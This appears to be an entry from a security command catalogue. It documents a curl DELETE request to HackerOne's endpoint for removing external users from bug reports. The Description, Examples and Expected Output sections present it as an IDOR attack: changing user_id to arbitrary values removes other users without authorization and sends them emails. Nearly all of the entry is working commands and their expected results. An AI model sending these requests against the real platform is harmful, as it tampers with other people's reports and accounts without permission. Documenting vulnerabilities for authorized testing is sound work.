---
data: >-
  curl -X DELETE
  "https://hackerone.com/reports/<report_id>/external_users/<user_id>" -H
  "X-CSRF-Token: <token>" -H "Cookie: <cookies>" -H "Referer: <referer>" -H
  "X-Requested-With: XMLHttpRequest" -H "Accept-Language: en-US,en;q=0.5" -H
  "Accept-Encoding: gzip, deflate"
tags:
  - web
  - http
  - delete
  - hackerone
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.558Z'
id: 24acf6ba-7bc9-421c-b6c0-8b1bb03ccae1
verified: false
validated: true
submitted: true
---
# delete-hackerone-external-user

## Command

```bash
curl -X DELETE "https://hackerone.com/reports/<report_id>/external_users/<user_id>" -H "X-CSRF-Token: <token>" -H "Cookie: <cookies>" -H "Referer: <referer>" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate"
```

## Description

This command sends a DELETE request to HackerOne's endpoint for removing external users from bug reports. Used to test IDOR by modifying user_id to arbitrary values, triggering unauthorized notifications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<report_id>` | ID of the target bug report | Yes |
| `<user_id>` | ID of the external user to remove (modifiable for IDOR) | Yes |
| `<token>` | CSRF protection token from session | Yes |
| `<cookies>` | Authentication session cookies | Yes |
| `<referer>` | Referer header from the report page | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE "https://hackerone.com/reports/123/external_users/456" -H "X-CSRF-Token: abc123" -H "Cookie: session=def456" -H "Referer: https://hackerone.com/reports/123"
```

### Advanced Usage

```bash
curl -X DELETE "https://hackerone.com/reports/123/external_users/789" -H "X-CSRF-Token: abc123" -H "Cookie: session=def456" -H "Referer: https://hackerone.com/reports/123" -v
```

## Expected Output

HTTP 200 OK response indicating successful deletion, even for unauthorized user_id. Triggers an email to the targeted user and updates the report list incorrectly.

## Related

- [[Related Procedure]]
